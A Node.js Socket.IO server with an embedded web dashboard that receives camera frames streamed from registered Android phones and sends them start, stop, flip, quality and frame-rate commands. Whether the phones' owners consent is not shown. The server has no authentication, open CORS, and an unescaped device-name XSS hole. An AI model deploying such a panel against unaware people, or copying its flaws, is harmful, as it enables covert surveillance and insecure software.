const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Store data
let connectedDevices = [];
let currentSettings = {
  fps: 15,
  quality: "240p",
  flip: false
};

// Socket.IO Connection
io.on('connection', (socket) => {
  console.log('📱 New connection:', socket.id);
  
  socket.on('register_device', (data) => {
    const device = {
      id: socket.id,
      name: data.deviceName || data.model || "Android Device",
      model: data.model || "Unknown",
      status: "online",
      connectedAt: new Date().toISOString()
    };
    connectedDevices.push(device);
    console.log(`✅ Device registered: ${device.name}`);
    io.emit('devices_list', connectedDevices);
  });
  
  socket.on('stream_frame', (data) => {
    if (data && data.image) {
      // Broadcast to all web clients
      io.emit('new_frame', { 
        image: data.image, 
        timestamp: Date.now(),
        deviceId: socket.id
      });
    }
  });
  
  socket.on('command', (data) => {
    console.log('📡 Command:', data.command, data.value || '');
    // Broadcast command to all devices or specific device
    if (data.deviceId) {
      io.to(data.deviceId).emit('command', data);
    } else {
      io.emit('command', data);
    }
  });
  
  socket.on('disconnect', () => {
    connectedDevices = connectedDevices.filter(d => d.id !== socket.id);
    io.emit('devices_list', connectedDevices);
    console.log('❌ Device disconnected');
  });
});

// Single Page - All Features
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
        <title>Ludoo Camera Controller</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                background: #0a0e27;
                min-height: 100vh;
                padding: 20px;
            }
            
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            
            /* Header */
            .header {
                margin-bottom: 20px;
            }
            
            .header h1 {
                color: white;
                font-size: 24px;
                font-weight: 600;
            }
            
            .header p {
                color: #6c7293;
                font-size: 14px;
                margin-top: 5px;
            }
            
            /* Status Cards */
            .status-cards {
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .status-card {
                background: #151932;
                border-radius: 16px;
                padding: 15px;
                border: 1px solid #1e243e;
            }
            
            .status-label {
                color: #6c7293;
                font-size: 12px;
                margin-bottom: 8px;
            }
            
            .status-value {
                color: white;
                font-size: 24px;
                font-weight: 700;
            }
            
            .status-unit {
                color: #6c7293;
                font-size: 12px;
                margin-left: 4px;
            }
            
            /* Main Content */
            .main-content {
                display: grid;
                grid-template-columns: 1fr 320px;
                gap: 20px;
                margin-bottom: 20px;
            }
            
            /* Video Section */
            .video-section {
                background: #151932;
                border-radius: 20px;
                overflow: hidden;
                border: 1px solid #1e243e;
            }
            
            .video-container {
                position: relative;
                background: #0a0e27;
                min-height: 400px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            #videoStream {
                width: 100%;
                max-height: 500px;
                object-fit: contain;
            }
            
            .stream-placeholder {
                text-align: center;
                color: #6c7293;
                padding: 60px 20px;
            }
            
            .stream-placeholder svg {
                width: 80px;
                height: 80px;
                margin-bottom: 15px;
                opacity: 0.5;
            }
            
            /* Controls Section */
            .controls-section {
                background: #151932;
                border-radius: 20px;
                padding: 20px;
                border: 1px solid #1e243e;
            }
            
            .section-title {
                color: white;
                font-size: 16px;
                font-weight: 600;
                margin-bottom: 15px;
                padding-bottom: 10px;
                border-bottom: 1px solid #1e243e;
            }
            
            /* Live Controls */
            .live-controls {
                display: flex;
                gap: 12px;
                margin-bottom: 25px;
            }
            
            .btn-live {
                flex: 1;
                padding: 12px;
                border: none;
                border-radius: 12px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s;
                background: #1e243e;
                color: white;
            }
            
            .btn-live.active {
                background: #4CAF50;
                color: white;
            }
            
            .btn-live.stop {
                background: #1e243e;
            }
            
            .btn-live.stop.active {
                background: #f44336;
            }
            
            .btn-camera {
                flex: 1;
                padding: 12px;
                border: none;
                border-radius: 12px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                background: #1e243e;
                color: white;
                transition: all 0.3s;
            }
            
            .btn-camera:hover {
                background: #2196F3;
            }
            
            /* Quality Options */
            .quality-options {
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                gap: 10px;
                margin-bottom: 25px;
            }
            
            .quality-btn {
                padding: 10px;
                border: 1px solid #1e243e;
                background: #1e243e;
                border-radius: 12px;
                cursor: pointer;
                font-size: 13px;
                font-weight: 500;
                transition: all 0.3s;
                text-align: center;
                color: white;
            }
            
            .quality-btn.active {
                background: #4CAF50;
                border-color: #4CAF50;
                color: white;
            }
            
            /* FPS Slider */
            .fps-control {
                margin-bottom: 25px;
            }
            
            .fps-label {
                display: flex;
                justify-content: space-between;
                color: white;
                font-size: 14px;
                margin-bottom: 10px;
            }
            
            .fps-slider {
                width: 100%;
                height: 4px;
                -webkit-appearance: none;
                background: #1e243e;
                border-radius: 2px;
                outline: none;
            }
            
            .fps-slider::-webkit-slider-thumb {
                -webkit-appearance: none;
                width: 16px;
                height: 16px;
                background: #4CAF50;
                border-radius: 50%;
                cursor: pointer;
            }
            
            .fps-value {
                text-align: center;
                color: #6c7293;
                font-size: 12px;
                margin-top: 8px;
            }
            
            /* Device List */
            .devices-section {
                background: #151932;
                border-radius: 20px;
                padding: 20px;
                border: 1px solid #1e243e;
            }
            
            .device-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 15px;
            }
            
            .device-header h3 {
                color: white;
                font-size: 16px;
                font-weight: 600;
            }
            
            .device-count {
                background: #1e243e;
                padding: 4px 10px;
                border-radius: 20px;
                color: #6c7293;
                font-size: 12px;
            }
            
            .devices-list {
                max-height: 250px;
                overflow-y: auto;
            }
            
            .device-item {
                background: #1e243e;
                padding: 12px;
                border-radius: 12px;
                margin-bottom: 8px;
                display: flex;
                align-items: center;
                justify-content: space-between;
                cursor: pointer;
                transition: all 0.3s;
            }
            
            .device-item:hover {
                background: #252b4a;
            }
            
            .device-item.selected {
                background: #4CAF50;
            }
            
            .device-info {
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .device-icon {
                font-size: 20px;
            }
            
            .device-name {
                color: white;
                font-size: 14px;
                font-weight: 500;
            }
            
            .device-status {
                width: 8px;
                height: 8px;
                background: #4CAF50;
                border-radius: 50%;
                margin-left: 8px;
            }
            
            /* No Stream */
            .no-stream {
                text-align: center;
                padding: 60px 20px;
            }
            
            .no-stream svg {
                width: 80px;
                height: 80px;
                margin-bottom: 15px;
                opacity: 0.3;
            }
            
            .no-stream p {
                color: #6c7293;
                font-size: 14px;
            }
            
            /* Responsive */
            @media (max-width: 768px) {
                body {
                    padding: 15px;
                }
                
                .status-cards {
                    grid-template-columns: repeat(2, 1fr);
                    gap: 10px;
                }
                
                .main-content {
                    grid-template-columns: 1fr;
                }
                
                .quality-options {
                    grid-template-columns: repeat(4, 1fr);
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Multi-Device Remote</h1>
                <p>Select a device to view</p>
            </div>
            
            <div class="status-cards">
                <div class="status-card">
                    <div class="status-label">STATUS</div>
                    <div class="status-value" id="serverStatus">Online</div>
                </div>
                <div class="status-card">
                    <div class="status-label">DEVICES</div>
                    <div class="status-value" id="deviceCount">0</div>
                </div>
                <div class="status-card">
                    <div class="status-label">FPS</div>
                    <div class="status-value" id="fpsDisplay">0</div>
                </div>
                <div class="status-card">
                    <div class="status-label">QUALITY</div>
                    <div class="status-value" id="qualityDisplay">240p</div>
                </div>
            </div>
            
            <div class="main-content">
                <div class="video-section">
                    <div class="video-container">
                        <img id="videoStream" src="" style="display: none;">
                        <div id="noStream" class="no-stream">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                                <rect x="2" y="4" width="20" height="16" rx="2" />
                                <path d="M8 4v16M16 4v16M2 8h20M2 16h20" />
                            </svg>
                            <p>Camera Stream<br>No stream</p>
                        </div>
                    </div>
                </div>
                
                <div class="controls-section">
                    <div class="section-title">CONTROLS</div>
                    
                    <div class="live-controls">
                        <button class="btn-live" id="startBtn">▶ LIVE</button>
                        <button class="btn-live stop" id="stopBtn">⏹ STOP</button>
                        <button class="btn-camera" id="flipBtn">📷 CAMERA</button>
                    </div>
                    
                    <div class="section-title">QUALITY</div>
                    <div class="quality-options">
                        <button class="quality-btn" data-quality="120p">120p</button>
                        <button class="quality-btn" data-quality="140p">140p</button>
                        <button class="quality-btn" data-quality="240p">240p</button>
                        <button class="quality-btn" data-quality="360p">360p</button>
                    </div>
                    
                    <div class="section-title">FPS</div>
                    <div class="fps-control">
                        <div class="fps-label">
                            <span>Frame Rate</span>
                            <span id="fpsValue">15</span>
                        </div>
                        <input type="range" id="fpsSlider" min="5" max="30" value="15" class="fps-slider">
                        <div class="fps-value">Lower FPS saves data</div>
                    </div>
                </div>
            </div>
            
            <div class="devices-section">
                <div class="device-header">
                    <h3>CONNECTED DEVICES</h3>
                    <div class="device-count" id="deviceCountBadge">0</div>
                </div>
                <div class="devices-list" id="devicesContainer">
                    <div class="device-item">
                        <div class="device-info">
                            <span class="device-icon">📱</span>
                            <span class="device-name">No devices connected</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script>
            const socket = io();
            let frameCount = 0;
            let lastFpsUpdate = Date.now();
            let selectedDeviceId = null;
            let currentSettings = {
                quality: "240p",
                fps: 15,
                flip: false
            };
            
            // Get elements
            const videoStream = document.getElementById('videoStream');
            const noStreamDiv = document.getElementById('noStream');
            const deviceCountSpan = document.getElementById('deviceCount');
            const deviceCountBadge = document.getElementById('deviceCountBadge');
            const devicesContainer = document.getElementById('devicesContainer');
            const fpsDisplay = document.getElementById('fpsDisplay');
            const fpsSlider = document.getElementById('fpsSlider');
            const fpsValue = document.getElementById('fpsValue');
            const qualityDisplay = document.getElementById('qualityDisplay');
            
            // Socket events
            socket.on('connect', () => {
                console.log('Connected to server');
                document.getElementById('serverStatus').innerHTML = 'Online';
            });
            
            socket.on('new_frame', (data) => {
                if (data && data.image && (selectedDeviceId === null || selectedDeviceId === data.deviceId)) {
                    videoStream.src = 'data:image/jpeg;base64,' + data.image;
                    videoStream.style.display = 'block';
                    noStreamDiv.style.display = 'none';
                    
                    frameCount++;
                    const now = Date.now();
                    if (now - lastFpsUpdate >= 1000) {
                        fpsDisplay.textContent = frameCount;
                        frameCount = 0;
                        lastFpsUpdate = now;
                    }
                }
            });
            
            socket.on('devices_list', (devices) => {
                deviceCountSpan.textContent = devices.length;
                deviceCountBadge.textContent = devices.length;
                
                if (devices.length === 0) {
                    devicesContainer.innerHTML = '<div class="device-item"><div class="device-info"><span class="device-icon">📱</span><span class="device-name">No devices connected</span></div></div>';
                    videoStream.style.display = 'none';
                    noStreamDiv.style.display = 'block';
                    selectedDeviceId = null;
                } else {
                    devicesContainer.innerHTML = devices.map(device => `
                        <div class="device-item ${selectedDeviceId === device.id ? 'selected' : ''}" onclick="selectDevice('${device.id}')">
                            <div class="device-info">
                                <span class="device-icon">📱</span>
                                <span class="device-name">${device.name}</span>
                                <div class="device-status"></div>
                            </div>
                        </div>
                    `).join('');
                }
            });
            
            // Select device
            window.selectDevice = (deviceId) => {
                selectedDeviceId = deviceId;
                // Refresh device list to show selection
                socket.emit('get_devices');
            };
            
            // Send command function
            function sendCommand(command, value = null) {
                const data = { 
                    command: command,
                    deviceId: selectedDeviceId
                };
                if (value !== null) data.value = value;
                socket.emit('command', data);
                console.log('Command sent:', command, value);
            }
            
            // Button events
            document.getElementById('startBtn').onclick = () => {
                document.getElementById('startBtn').classList.add('active');
                sendCommand('start');
            };
            
            document.getElementById('stopBtn').onclick = () => {
                document.getElementById('startBtn').classList.remove('active');
                sendCommand('stop');
            };
            
            document.getElementById('flipBtn').onclick = () => {
                currentSettings.flip = !currentSettings.flip;
                sendCommand('flip');
            };
            
            // Quality buttons - Only 4 options
            document.querySelectorAll('.quality-btn').forEach(btn => {
                btn.onclick = () => {
                    document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    const quality = btn.dataset.quality;
                    currentSettings.quality = quality;
                    qualityDisplay.textContent = quality;
                    let qualityValue = parseInt(quality.replace('p', ''));
                    sendCommand('quality', qualityValue);
                };
            });
            
            // Set default active quality
            document.querySelector('.quality-btn[data-quality="240p"]').classList.add('active');
            
            // FPS slider
            fpsSlider.oninput = () => {
                const fps = parseInt(fpsSlider.value);
                fpsValue.textContent = fps;
                currentSettings.fps = fps;
                sendCommand('fps', fps);
            };
            
            // Refresh devices list periodically
            setInterval(() => {
                socket.emit('get_devices');
            }, 5000);
            
            socket.on('get_devices', () => {
                // This is just to trigger devices_list
            });
        </script>
    </body>
    </html>
  `);
});

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    devices: connectedDevices.length,
    uptime: process.uptime()
  });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('═══════════════════════════════════════════════════');
  console.log('✅ Ludoo Camera Controller Server Started');
  console.log('═══════════════════════════════════════════════════');
  console.log(`🌐 Web Interface: http://0.0.0.0:${PORT}`);
  console.log(`💪 Health Check: http://0.0.0.0:${PORT}/health`);
  console.log('═══════════════════════════════════════════════════');
  console.log('');
  console.log('📱 Features:');
  console.log('   • Multiple Device Support');
  console.log('   • 4 Quality Options: 120p | 140p | 240p | 360p');
  console.log('   • Flip Camera');
  console.log('   • FPS Control (5-30 FPS)');
  console.log('   • Live/Stop Controls');
  console.log('');
  console.log('📡 Waiting for Android device...');
  console.log('');
});
